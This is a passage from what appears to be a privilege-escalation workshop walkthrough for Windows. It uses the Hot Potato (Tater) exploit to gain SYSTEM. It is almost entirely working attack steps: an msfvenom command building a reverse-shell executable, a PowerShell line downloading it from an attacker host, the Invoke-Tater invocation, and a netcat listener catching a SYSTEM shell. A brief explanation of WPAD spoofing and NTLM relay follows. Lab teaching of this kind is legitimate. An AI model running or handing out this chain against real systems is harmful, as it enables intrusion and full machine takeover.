Because my online Powershell encoder is currently down, we will have the exploit execute an msfvenom payload to give us a new reverse shell.

````
root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=1337 LHOST=YOURIPHERE -f exe > potato.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
root@kali:~/LPEWorkshop# 
````
Now we transfer the file to the victim.

````
PS C:\Users\user> IEX (New-Object Net.WebClient).DownloadFile('http://10.22.6.122/potato.exe', 'C:\Users\user\Downloads\potato.exe')
````

Then we invoke the command so that we can get elevation:
````
PS C:\Users\user\Downloads> Invoke-Tater -Trigger 1 -Command "C:\Users\user\Downloads\potato.exe"
````
And then in short order we get our reverse shell as NT\System:

````
root@kali:~/LPEWorkshop# nc -lvnp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.22.6.43.
Ncat: Connection from 10.22.6.43:52753.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
````

And we see in our terminal the steps that were taken:
````
PS C:\Users\user\Downloads> Invoke-Tater -Trigger 1 -Command "C:\Users\user\Downloads\potato.exe"
2020-01-08T12:08:26 - Tater (Hot Potato Privilege Escalation) started
Local IP Address = 10.22.6.43
Spoofing Hostname = WPAD
Windows Defender Trigger Enabled
Real Time Console Output Enabled
Run Stop-Tater to stop Tater early
Use Get-Command -Noun Tater* to show available functions
Press any key to stop real time console output

2020-01-08T12:08:26 - Waiting for incoming HTTP connection
2020-01-08T12:08:26 - Flushing DNS resolver cache
2020-01-08T12:08:27 - Starting NBNS spoofer to resolve WPAD to 127.0.0.1
2020-01-08T12:08:35 - WPAD has been spoofed to 127.0.0.1
2020-01-08T12:08:35 - Running Windows Defender signature update
2020-01-08T12:08:37 - HTTP request for /wpad.dat received from 127.0.0.1
2020-01-08T12:08:41 - Attempting to redirect to http://localhost:80/gethashes and trigger relay
2020-01-08T12:08:41 - HTTP request for http://ds.download.windowsupdate.com/v11/2/windowsupdate/redir/v6-win7sp1-wuredir.cab?2001081908 received from 127.0.0.1
2020-01-08T12:08:45 - HTTP request for /GETHASHES received from 127.0.0.1
2020-01-08T12:08:46 - HTTP to SMB relay triggered by 127.0.0.1
2020-01-08T12:08:46 - Grabbing challenge for relay from 127.0.0.1
2020-01-08T12:08:46 - Received challenge 13B7858E7D232D4F for relay from 127.0.0.1
2020-01-08T12:08:46 - Providing challenge 13B7858E7D232D4F for relay to 127.0.0.1
2020-01-08T12:08:47 - Sending response for \ for relay to 127.0.0.1
2020-01-08T12:08:47 - HTTP to SMB relay authentication successful for \ on 127.0.0.1
2020-01-08T12:08:47 - SMB relay service GCAOIDVEOABQUCYYKJRT created on 127.0.0.1
2020-01-08T12:09:17 - Command likely executed on 127.0.0.1
2020-01-08T12:09:17 - SMB relay service GCAOIDVEOABQUCYYKJRT deleted on 127.0.0.1
2020-01-08T12:09:18 - Stopping HTTP listener
2020-01-08T12:09:21 - Tater was successful and has exited
PS C:\Users\user\Downloads> 
````

Let's talk through some of the steps here:

We setup a local spoofer for WPAD, then we trigger the vulnerability by asking Defender to check for updates. Because Defender is running as NT\SYSTEM we can get a hash to relay to our own SMB server. Once we relay this to our local SMB server we can then execute a command.
